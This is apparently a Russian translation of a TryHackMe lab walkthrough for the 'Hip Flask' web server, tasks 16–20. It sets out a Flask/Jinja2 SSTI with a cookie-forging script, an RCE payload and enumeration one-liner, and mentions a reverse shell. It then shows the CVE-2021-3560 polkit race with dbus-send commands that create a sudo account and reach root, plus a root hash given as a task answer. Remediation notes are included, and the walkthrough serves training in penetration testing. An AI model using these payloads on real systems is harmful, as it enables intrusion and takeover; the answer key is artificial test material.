В частности, задействованный код (из modules/admin.py) выглядит следующим образом:

Помимо использования встроенной строки для шаблона (что является как беспорядочной, так и отвратительно плохой практикой), это также внедряет содержимое session["username"]непосредственно в шаблон перед его рендерингом. Он делает то же самое с uniqueViews(количеством уникальных посетителей сайта); однако мы не можем изменить это. Что мы можем сделать, так это изменить наше имя пользователя на что-то , что шаблонизатор Flask ( Jinja2 ) будет оценивать как код. Эта уязвимость называется SSTI — Server S ide T emplate I njection; она может легко привести к удаленному выполнению кода на цели.

Уже есть целая комната, посвященная SSTI в приложениях Flask , поэтому мы не будем здесь вдаваться в подробности предыстории уязвимости. Короткая версия такова:

Flask использует шаблонизатор Jinja2. Шаблонизатор используется для «рендеринга» статических шаблонов — другими словами, он работает с веб-приложением, чтобы подставлять переменные и выполнять фрагменты кода напрямую с шаблоном. Например, взгляните на следующий HTML:

Пример шаблона Jinja2
```commandline
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>{{title}}</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>
Заметили что-нибудь необычное? {{title}}В этом HTML-коде есть . Эта {{ }}структура (и несколько других подобных структур) сообщает Jinja2, что ей нужно что-то сделать с этим шаблоном — в частности, в этом случае это будет заполнение переменной с именем title. Затем это можно вызвать в конце маршрута Flask с помощью кода Python, который выглядит примерно так:
return render_template("test.html", title="Templates!"), 200
```

Затем он Templates!будет подставлен в качестве заголовка страницы при ее загрузке в браузере клиента.

Это все хорошо, но что произойдет, если мы будем контролировать шаблон? Что, если мы сможем добавлять вещи непосредственно в шаблон до того, как он будет отрисован? Мы могли бы вставлять блоки кода в фигурные скобки, и Jinja2 будет выполнять их при отрисовке шаблона.

Вот пример:

Пример строки_шаблона_рендеринга
```commandline
title = "Templates!"
response = f"""
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>{title}</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>"""
return render_template_string(response), 200
```
Вместо использования render_templateэтот код использует render_template_stringфункцию для рендеринга шаблона, сохраненного как встроенная строка Python. Вместо передачи переменной titleв Jinja2 для рендеринга, f-строка Python используется для форматирования шаблона перед его рендерингом. Другими словами, разработчик подставил содержимое titleдо того, как строка фактически была передана в шаблонизатор.

Это нормально для приведенного выше примера (если не соблюдать правила), но что произойдет, если заголовок будет, скажем, таким: {{7*6}}?

```commandline
{{7*6}}
title = "{{7*6}}"
response = f"""
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>{title}</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>"""
return render_template_string(response), 200
```
Заметили, насколько это похоже на код, который мы видели в admin.pyмодуле?

Это шаблон, который получит шаблонизатор:

Введенный шаблон
```commandline
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>{{7*6}}</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>
```
Это означает, что Jinja2 вычислит 7*6 и отобразит это клиенту:

Оцененный шаблон — SSTI!
```commandline
<!DOCTYPE html>
<html lang=en>
   <head>
       <title>42</title>
   </head>
   <body>
       <h1>Learn Templating!</h1>
   </body>
</html>
```
Заставить механизм шаблонизации выполнять для нас простые вычисления не слишком полезно, но это действительно хороший способ продемонстрировать наличие уязвимости SSTI.

Это может произойти только в том случае, если разработчик обращается с шаблонами исключительно глупо (что, в случае с этим веб-приложением, и происходит). Независимо от этого, это все еще одна из самых стереотипных уязвимостей, которые можно найти в приложении Flask — и на то есть причина. Лучшим вариантом было бы передать переменные, которые нужно отрисовать, в Jinja2, а не редактировать шаблон напрямую.

Хорошо, давайте подтвердим наличие уязвимости SSTI.

Мы можем использовать тот же сценарий Proof of Concept, который мы написали для подделки нашего административного cookie-файла, но на этот раз мы установим имя пользователя на « {{7*6}}»:

```commandline
#!/usr/bin/python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "70a5411082ea8e48cc9e7f7d7c12f2c2"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "{{7*6}}"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```
Не забудьте изменить секретный ключ, если вы копируете/вставляете!

Нам нужно запустить это, а затем снова перезаписать наш сеансовый cookie-файл сгенерированным cookie-файлом.

Сладкий успех!

### Ответьте на вопросы ниже
Подтвердите наличие SSTI в заявке.
```commandline
Ответ не нужен
```

## Задание 17
Хорошо, мы продемонстрировали SSTI. Как мы можем превратить его в оружие?

Как всегда, PayloadsAllTheThings — наш друг, особенно раздел Jinja на странице SSTI.

Здесь доступны различные полезные нагрузки RCE . Методом проб и ошибок мы находим ту, которая работает:
`{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`

Если мы вставим это в наш PoC- код в поле имени пользователя, а затем выполним скрипт и перезапишем наш cookie еще 
раз, мы сможем убедиться, что это работает:
Почти время превратить это в оружие, но сначала нам нужно сделать небольшой подсчет. В частности, нам нужно знать, 
есть ли на месте брандмауэр, какое программное обеспечение установлено и, желательно, есть ли какие-либо защитные 
меры. Это Linux , поэтому вероятность иметь дело с антивирусом минимальна, но нам может потребоваться обойти меры 
защиты (например, AppArmour, SeLinux и т. д.).

Запуск нескольких команд в этой ситуации — это боль, поскольку нам нужно будет генерировать новый cookie для каждой 
команды. Вместо этого мы просто используем одну большую однострочную команду, чтобы перечислить как можно больше 
вещей одновременно:
session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('echo ""; id; whoami; echo ""; which nc bash curl wget; echo ""; sestatus 2>&1; aa-status 2>&1;  echo ""; cat /etc/*-release; echo""; cat /etc/iptables/*').read()}}"""

Это дает нам информацию о пользователях, полезном программном обеспечении, статусе блокировки, информацию о релизе и 
сведения о брандмауэре: достаточно, чтобы продолжить работу.

Вывод этого кода крайне сложно прочитать в маленьком информационном поле на странице администратора, поэтому лучше 
взглянуть на исходный код, чтобы получить удобный для чтения вывод:

Вывод перечисления

У вас недостаточно прав для чтения набора профилей.
Модуль apparmor загружен.


Это говорит нам о многом полезном:

www-dataКак и ожидалось, мы находимся в учетной записи с низкими привилегиями.
У нас достаточно полезного программного обеспечения для легкого выполнения веб-запросов и создания обратного шелла.
SeLinux не установлен. AppArmour установлен, и у нас нет разрешения просматривать статус, поэтому нам придется действовать вслепую и надеяться
Это машина с Ubuntu 20.04 — как и ожидалось.
Есть брандмауэр (как и ожидалось). Он блокирует весь исходящий трафик на все, кроме портов TCP 443, 445, 80, 25 или 53 и порта UDP 53. Исходящие пакеты ICMP разрешены. Правил IPv6 нет.
Мы сделали все, что могли на данный момент. Давайте получим оболочку и покончим с этим. Стандартная оболочка netcat mkfifo должна подойти:

Консоль администратора уязвима к уязвимости Server Side Template Injection, ведущей к удаленному выполнению кода. При использовании в цепочке с HF-WEB-3 это фактически позволяет выполнять неаутентифицированный RCE в качестве www-dataпользователя.

Измените исходный код веб-приложения так, чтобы он больше не изменял динамически шаблон перед рендерингом шаблонизатором Jinja2. Вместо этого передайте переменные непосредственно в Jinja2 для рендеринга.

### Ответьте на вопросы ниже
Подставьте свой собственный IP-адрес TryHackMe в команду выше и запустите прослушиватель netcat на порту 443 ( sudo netcat -lvnp 443).

Перезапишите свой файл cookie в последний раз и получите ракушку!
```commandline
Ответ не нужен
```

## Задание 18
Прежде чем мы сделаем что-то еще, давайте быстро стабилизируем нашу обратную оболочку. Поскольку www-dataмы не сможем использовать SSH, так что это отпадает. Мы могли бы загрузить socatи использовать это, но мы не знаем, что AppArmour делает прямо сейчас (хотя проверка этого с нашим новым доступом должна быть в начале нашего списка приоритетов!). Давайте вместо этого просто используем классическую технику стабилизации оболочки "Python". Это подробно объясняется в комнате Введение в оболочки , которую вам рекомендуется просмотреть, если вы еще этого не сделали.

Сначала давайте проверим, можем ли мы использовать Python:
`which python python3`

Утвердительный ответ означает, что этот метод хорош, поэтому начнем с создания PTY, работающего под управлением bash:
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Далее мы устанавливаем TERM переменную окружения. Это дает нам доступ к таким командам, как clear.
`export TERM=xterm`

Наконец, мы удаляем эхо терминала нашей собственной оболочки (чтобы мы могли использовать Ctrl + C / Ctrl + Z, не 
убивая нашу оболочку), и устанавливаем размер tty нашей удаленной оболочки таким образом, чтобы мы могли 
использовать полноэкранные программы, такие как текстовые редакторы.

Нажмите Ctrl + Z (или эквивалент на вашей клавиатуре), чтобы перевести удаленную оболочку в фоновый режим.
Запустите stty -aсвой собственный терминал и запишите значения для строк и столбцов.
Запустите stty raw -echo; fgсвой собственный терминал, чтобы отключить эхо терминала и вернуть удаленную оболочку на передний план.
Используйте stty rows NUMBER cols NUMBERв удаленной оболочке для установки размера tty.
Примечание: эти числа зависят от размера экрана и терминала и, скорее всего, будут разными для каждого.
Полные шаги стабилизации

```commandline
python3 -c 'import pty;pty.spawn("/bin/bash")'
$ www-data@websrv1:/opt/site$ export TERM=xterm
export TERM=xterm
www-data@websrv1:/opt/site$ ^Z
[1]+ Stopped                  sudo nc -lvnp 443
pentester@attacker:~$ stty -a | head -1
speed 38400 baud; rows 54; cols 239; line = 0;
pentester@attacker:~$ stty raw -echo;fg
sudo nc -lvnp 443

www-data@websrv1:/opt/site$ stty rows 54 cols 239
```

Бинго. Теперь мы в полностью стабилизированной оболочке.

Давайте быстро проверим /etc/apparmor.d каталог, чтобы увидеть, нет ли каких-либо конфигураций, которые могли бы 
ограничить нас при перечислении:

```commandline
Список каталогов /etc/apparmor.d
www-data@websrv1 $ ls -la /etc/apparmor.d
всего 112
drwxr-xr-x 4 root root 4096 12 июня 21:05 абстракции
drwxr-xr-x 2 root root 4096 12 июня 21:00 отключить
drwxr-xr-x 2 root root 4096 11 февр. 2020 принудительно подать жалобу
drwxr-xr-x 2 root root 4096 22 июня 18:42 местный
-rw-r--r-- 1 корень корень 1313 19 мая 2020 lsb_release
-rw-r--r-- 1 корень корень 1108 19 мая 2020 nvidia_modprobe
-rw-r--r-- 1 корень корень 3222 11 марта 2020 sbin.dhclient
drwxr-xr-x 5 root root 4096 26 окт. 2020 тюнинги
-rw-r--r-- 1 корень корень 11082 1 апр 09:35 usr.bin.evince
-rw-r--r-- 1 корень корень 9007 31 мая 21:32 usr.bin.firefox
-rw-r--r-- 1 корень корень 3202 25 февр. 2020 usr.bin.man
-rw-r--r-- 1 корень корень 1519 15 марта 18:12 usr.lib.libreoffice.program.oosplash
-rw-r--r-- 1 корень корень 1227 15 марта 18:12 usr.lib.libreoffice.program.senddoc
-rw-r--r-- 1 корень корень 10653 15 марта 18:12 usr.lib.libreoffice.program.soffice.bin
-rw-r--r-- 1 корень корень 1046 15 марта 18:12 usr.lib.libreoffice.program.xpdfimport
-rw-r--r-- 1 root root 540 10 апр. 2020 usr.sbin.cups-просмотрено
-rw-r--r-- 1 корень корень 5797 24 апр. 2020 usr.sbin.cupsd
-rw-r--r-- 1 корень корень 672 19 февр. 2020 usr.sbin.ippusbxd
-rw-r--r-- 1 корень корень 2477 28 сентября 2020 г. usr.sbin.named
-rw-r--r-- 1 корень корень 1575 11 февр. 2020 usr.sbin.rsyslogd
-rw-r--r-- 1 корень корень 1385 7 дек. 2019 usr.sbin.tcpdump
```
Не похоже, что есть какие-либо пользовательские политики или признаки того, что что-то заблокировано больше, чем 
конфигурация по умолчанию, поэтому мы должны быть готовы перейти к перечислению. Тем не менее, тот факт, что 
установлены FireFox, LibreOffice и cupsd, очень интересен — это указывает на то, что на машине установлена среда 
рабочего стола (предположительно, к ней подключен монитор для легкой настройки, где бы он ни находился в офисе 
клиента). Стоит иметь это в виду по мере продвижения.

Сейчас самое время запустить несколько скриптов перечисления (например, LinPEAS , LinEnum , LES , LSE , 
Unix-Privesc-Check и т. д.). Хорошей практикой будет запустить несколько из них, поскольку все они проверяют немного 
разные вещи, и то, что находит один, может не находить другой.

Тем не менее, прежде чем начать загрузку скриптов, мы также выполним несколько ручных проверок повышения привилегий. 
Это особенно полезно, если для атакуемого нами дистрибутива есть серьезные новые уязвимости, поскольку они могут 
быть еще не исправлены на цели. На момент написания статьи в модуле аутентификации Polkit есть совершенно новая 
уязвимость повышения привилегий , которая затрагивает Ubuntu 20.04 ( CVE -2021-3560 ), поэтому проверка на нее 
является абсолютной необходимостью. Запустив любой из скриптов (или проверив вручную), мы также обнаруживаем, что на 
машине нет учетных записей пользователей, и что SSH включен для пользователя root с закрытым ключом. Это указывает 
на то, что учетная запись root используется для повседневных административных задач.

Строгого порядка ручной проверки не существует, поэтому давайте сразу перейдем к ней и найдем неисправленное 
программное обеспечение:

Список устаревшего программного обеспечения, установленного на коробке
```commandline
www-data@websrv1 $ apt list --upgradeable
Листинг... Готово
alsa-ucm-conf/focal-updates 1.2.2-1ubuntu0.8 все [обновляемо с: 1.2.2-1ubuntu0.7]
bluez-obexd/focal-updates,focal-security 5.53-0ubuntu3.2 amd64 [обновляется с: 5.53-0ubuntu3.1]
bluez/focal-updates,focal-security 5.53-0ubuntu3.2 amd64 [обновляется с: 5.53-0ubuntu3.1]
firefox/focal-updates,focal-security 89.0.2+build1-0ubuntu0.20.04.1 amd64 [обновляется с: 89.0+build2-0ubuntu0.20.04.2]
gcc-10-base/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [обновляется с: 10.2.0-5ubuntu1~20.04]
gir1.2-secret-1/focal-updates 0.20.4-0ubuntu1 amd64 [обновляется с: 0.20.3-0ubuntu1]
initramfs-tools-bin/focal-updates 0.136ubuntu6.6 amd64 [обновляется с: 0.136ubuntu6.5]
initramfs-tools-core/focal-updates 0.136ubuntu6.6 все [обновляется с: 0.136ubuntu6.5]
initramfs-tools/focal-updates 0.136ubuntu6.6 все [обновляемо с: 0.136ubuntu6.5]
libatomic1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [обновляется с: 10.2.0-5ubuntu1~20.04]
libcc1-0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [обновляется с: 10.2.0-5ubuntu1~20.04]
libgcc-s1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [обновляется с: 10.2.0-5ubuntu1~20.04]
libgomp1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [обновляется с: 10.2.0-5ubuntu1~20.04]
libhogweed5/focal-updates,focal-security 3.5.1+really3.5.1-2ubuntu0.2 amd64 [обновляется с: 3.5.1+really3.5.1-2ubuntu0.1]
libitm1/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [обновляется с: 10.2.0-5ubuntu1~20.04]
liblsan0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [обновляется с: 10.2.0-5ubuntu1~20.04]
libnettle7/focal-updates,focal-security 3.5.1+really3.5.1-2ubuntu0.2 amd64 [обновляется с: 3.5.1+really3.5.1-2ubuntu0.1]
libnss-systemd/focal-updates 245.4-4ubuntu3.7 amd64 [обновляется с: 245.4-4ubuntu3.6]
libpam-systemd/focal-updates 245.4-4ubuntu3.7 amd64 [обновляется с: 245.4-4ubuntu3.6]
libpolkit-agent-1-0/focal-updates,focal-security 0.105-26ubuntu1.1 amd64 [обновляется с: 0.105-26ubuntu1]
libpolkit-gobject-1-0/focal-updates,focal-security 0.105-26ubuntu1.1 amd64 [обновляется с: 0.105-26ubuntu1]
libprocps8/focal-updates 2:3.3.16-1ubuntu2.2 amd64 [обновляется с: 2:3.3.16-1ubuntu2.1]
libpulse-mainloop-glib0/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [обновляется с: 1:13.99.1-1ubuntu3.10]
libpulse0/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [обновляется с: 1:13.99.1-1ubuntu3.10]
libpulsedsp/focal-updates 1:13.99.1-1ubuntu3.11 amd64 [обновляется с: 1:13.99.1-1ubuntu3.10]
libquadmath0/focal-updates,focal-security 10.3.0-1ubuntu1~20.04 amd64 [обновляется с: 10.2.0-5ubuntu1~20.04]
libsecret-1-0/focal-updates 0.20.4-0ubuntu1 amd64 [обновляется с: 0.20.3-0ubuntu1]
libsecret-common/focal-updates 0.20.4-0ubuntu1 все [обновляемо с: 0.20.3-0ubuntu1]
---
```
Целый список! Эта машина явно нуждается в некоторой модернизации, что может быть очень хорошо для нас и очень плохо 
для клиента. 

К сожалению для клиента, библиотеки polkit не обновлены (версия, 0.105-26ubuntu1а не 0.105-26ubuntu1.1), что 
означает, что мы должны иметь возможность повысить привилегии напрямую до root, используя CVE -2021-3560.

Учетная запись root используется для повседневного администрирования сервера и имеет доступ по протоколу SSH с 
помощью закрытого ключа. 
Создайте нового пользователя(ей) с соответствующими разрешениями для входа в систему и выполнения повседневного 
администрирования. 

Удалите доступ к входу в систему с учетной записью root и используйте sudoили pkexecиз учетной записи с более 
низкими привилегиями, когда требуются привилегии root.

### Ответьте на вопросы ниже
Укрепите корпус и осмотрите машину.

```commandline
Ответ не нужен
```

## Задание 19
CVE -2021-3560, к счастью, очень легко эксплуатируемая уязвимость, если условия правильные. Уязвимость фактически является состоянием гонки в системе аутентификации инструментария политики.

Уже есть комната TryHackMe, в которой эта уязвимость рассматривается гораздо более подробно , поэтому, пожалуйста, заполните ее, прежде чем продолжить, если вы еще этого не сделали, поскольку здесь мы не будем рассматривать «закулисье» уязвимости так же подробно.

По сути, нам нужно отправить пользовательское сообщение dbus демону учетных записей и завершить его примерно на полпути выполнения (после того, как его получит polkit, но до того, как polkit успеет проверить, является ли оно легитимным — или нет, как в данном случае).

Мы попытаемся создать новую учетную запись под названием "attacker" с привилегиями sudo. Прежде чем мы это сделаем, давайте проверим, существует ли уже учетная запись с таким именем:

Проверьте, существует ли учетная запись
`www-data@websrv1$ id attacker
id: ‘attacker’: no such user`
Отлично — это имя пользователя можно использовать бесплатно!

Теперь, когда мы установили, что можем создать новую учетную запись с именем пользователя «attacker», не нарушая работу всего сервера, давайте оценим, сколько времени требуется для отправки и обработки сообщения dbus демону учетных записей:
`time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
`
Это пытается создать нашу новую учетную запись и засекает время, необходимое для завершения команды. На целевой машине это должно быть около 11 миллисекунд:

Выбор времени атаки
`www-data@websrv1:/opt/site$ время dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Учетная запись пентестера" int32:1
Ошибка org.freedesktop.Accounts.Error.PermissionDenied: Требуется аутентификация

реальный	 0м0.011с
пользователь 0m0.002s
сис 0м0.000с`

Теперь нам нужно взять то же самое сообщение dbus, отправить его, а затем оборвать его примерно на полпути выполнения. 5 миллисекунд, как правило, достаточно хорошо подходят для этого блока:
`dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
`
Затем мы можем проверить, была ли создана новая учетная запись ( id attacker):

Добавление аккаунта
```commandline
www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
[1] 934
www-data@websrv1:/opt/site$ 
[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
www-data@websrv1:/opt/site$ id attacker
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)
```
Примечание: возможно, вам придется повторить это несколько раз с разными задержками, прежде чем учетная запись будет создана.

Обратите внимание, что эта учетная запись находится в группе sudoers. Для полного разбора этой команды обратитесь к Polkit room .

Далее нам нужно установить пароль для этой учетной записи. Мы используем здесь точно такую же технику, но с другим сообщением dbus. Та задержка, которая сработала в прошлый раз, должна сработать и здесь:
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!

Это установит пароль нашей новой учетной записи Expl01ted— и теперь все готово для того, чтобы мы могли получить suправа sudo -sroot!

Получаю root!
```commandline
www-data@websrv1:/opt/site$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
[1] 994
www-data@websrv1:/opt/site$ su attacker
Password: 
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

attacker@websrv1:/opt/site$ sudo -s
[sudo] password for attacker: 
root@websrv1:/opt/site# whoami
root
root@websrv1:/opt/site# id
uid=0(root) gid=0(root) groups=0(root)
root@websrv1:/opt/site# ip a
1: lo:  mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0:  mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:e4:5b:fc:14:69 brd ff:ff:ff:ff:ff:ff
    inet MACHINE_IP/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2822sec preferred_lft 2822sec
    inet6 fe80::e4:5bff:fefc:1469/64 scope link 
       valid_lft forever preferred_lft forever
```
И на этом мы закончили. Хотя на самом деле это не так, потому что нам следует продолжать искать больше уязвимостей. Цель оценки не обязательно заключается в том, чтобы «укоренить ящик» — цель состоит в том, чтобы выявить уязвимости в цели и поднять их вместе с клиентом. Возможность получить административные привилегии в отношении цели считается уязвимостью и помогает нам выявлять дальнейшие уязвимости, но это не является концом всего.

Устройство уязвимо к CVE -2021-3560 в модуле аутентификации Polkit
Выполните полное обновление программного обеспечения на устройстве как можно скорее ( sudo apt update && sudo apt upgrade). Если это невозможно, обновите следующие пакеты: policykit-1, libpolkit-agent-1-0и libpolkit-gobject-1-0, по крайней мере до версии: 0.105-26ubuntu1.1.

### Ответьте на вопросы ниже
+ 150
Можно было бы также доказать клиенту, что мы здесь были (помимо множества сделанных нами снимков экрана).

Каков хеш пароля пользователя root?
```commandline
$6$./Fh3mWMsk8X29kq$6CvaDzV7zlXKn1MMQjXtO.abB4/7ecNKBFkQvEWsLkgM8raAZeuSHZurnXG01pqZ4BY2ubk/WgIbo4ee.wnaP0
```
Продолжайте осматривать машину. Можете ли вы определить еще какие-либо уязвимые места?

```commandline
Ответ не нужен
```

## Задание 20
Прежде чем закончить, давайте объединим все обнаруженные нами уязвимости в одном месте:

Если бы это был реальный клиент, мы бы сейчас написали отчет, содержащий эту информацию. Написание отчетов выходит 
за рамки этой комнаты; однако, если вы хотите написать отчет и представить его в виде описания, следуя тем же 
правилам, что и в случае с Wreath, вам может пригодиться Задание 44 сети Wreath.

Также стоит отметить, что многие информационные записи были пропущены здесь для краткости (которые были бы включены 
в настоящий отчет), и не было предпринято никаких шагов после эксплуатации (например, попытки взломать хэш пароля 
root для проверки сложности пароля). Это то, что вы, возможно, захотите добавить для себя. Равным образом, вы, 
возможно, захотите выяснить, как разрешить Nessus работать с использованием учетных данных SSH (что обычно делается 
при прямом сотрудничестве клиента).

Мы завершили оценку веб-сервера Hip Flask.

Это было краткое введение в образ мышления и бюрократические процедуры, задействованные в атаке, подобной этой. 
Следует отметить, что — хотя все это реальные уязвимости — шансы увидеть kill-chain от сетевого доступа до root (как 
мы продемонстрировали здесь) значительно меньше в реальном столкновении. Независимо от этого, это, как мы надеемся, 
должно было дать некоторое введение в тему.
### Ответьте на вопросы ниже
Прочитайте заключение

```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)